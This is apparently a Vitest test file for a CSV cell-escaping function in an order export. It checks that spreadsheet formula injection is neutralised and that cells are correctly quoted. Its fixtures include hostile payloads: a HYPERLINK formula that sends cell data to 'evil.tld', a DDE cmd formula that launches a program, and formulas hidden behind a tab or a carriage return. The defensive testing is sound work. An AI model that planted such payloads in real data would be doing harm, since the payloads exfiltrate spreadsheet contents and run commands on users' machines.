import { describe, expect, it } from 'vitest'
import { csvCell } from '../../server/api/admin/orders/export.get'

describe('csvCell', () => {
  it('passes ordinary values through', () => {
    expect(csvCell('Zakariya')).toBe('Zakariya')
    expect(csvCell('ORD-ABC123')).toBe('ORD-ABC123')
    expect(csvCell(950)).toBe('950')
  })

  it('renders nothing for absent values', () => {
    expect(csvCell(null)).toBe('')
    expect(csvCell(undefined)).toBe('')
  })

  describe('formula injection', () => {
    it('neutralises every character a spreadsheet treats as a formula', () => {
      // A customer's name is whatever they typed. "=HYPERLINK(...)" is a legal
      // name, so it must be stored and exported — as text, not as code.
      for (const payload of [
        '=HYPERLINK("http://evil.tld?"&A1,"Ouvrir")',
        '+1+1',
        '-1+1',
        '@SUM(A1:A9)',
        '=cmd|\' /C calc\'!A0',
      ]) {
        const cell = csvCell(payload)
        expect(cell.replace(/^"/, '').startsWith("'")).toBe(true)
      }
    })

    it('neutralises a formula smuggled behind a tab or carriage return', () => {
      expect(csvCell('\t=1+1').replace(/^"/, '').startsWith("'")).toBe(true)
      expect(csvCell('\r=1+1').replace(/^"/, '').startsWith("'")).toBe(true)
    })

    it('leaves a value that merely contains an equals sign alone', () => {
      expect(csvCell('a=b')).toBe('a=b')
    })
  })

  describe('csv structure', () => {
    it('quotes and doubles embedded quotes', () => {
      expect(csvCell('He said "hello"')).toBe('"He said ""hello"""')
    })

    it('quotes values carrying the separator, so a column cannot be split', () => {
      expect(csvCell('Poitiers;86000')).toBe('"Poitiers;86000"')
      expect(csvCell('a,b')).toBe('"a,b"')
    })

    it('quotes values carrying a newline, so a row cannot be forged', () => {
      expect(csvCell('line one\nline two')).toBe('"line one\nline two"')
    })

    it('applies both defences at once', () => {
      const cell = csvCell('=1+1;drop')
      expect(cell).toBe(`"'=1+1;drop"`)
    })
  })
})
